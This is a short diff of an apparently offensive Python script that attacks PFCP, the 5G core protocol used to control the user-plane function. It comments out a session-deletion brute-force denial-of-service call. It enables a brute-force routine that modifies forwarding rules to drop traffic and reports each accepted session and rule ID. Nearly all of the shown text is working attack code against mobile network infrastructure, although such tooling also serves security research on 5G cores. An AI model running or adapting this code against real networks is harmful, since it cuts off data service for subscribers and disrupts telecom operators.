@@ -731,9 +731,9 @@ class PFCPDosAttack:
 
 
 ### SESSION DELETION ATTACK (DoS)
-objet_dos = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
-objet_dos.set_verbose(True)
-objet_dos.Start_pfcp_session_deletion_bruteforce(reqNbr=int(sys.argv[1]), num_threads=int(sys.argv[2]))
+# objet_dos = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
+# objet_dos.set_verbose(True)
+# objet_dos.Start_pfcp_session_deletion_bruteforce(reqNbr=int(sys.argv[1]), num_threads=int(sys.argv[2]))
 
 def Update_FAR_DROP(far_id):
 
@@ -777,4 +777,4 @@ def Start_pfcp_session_modification_far_drop_bruteforce():
                 print(f"PFCP session modification request accepted; SEID: {hex(seid)}, FAR_ID: {hex(farId)}")
     
 
-    
+Start_pfcp_session_modification_far_drop_bruteforce()
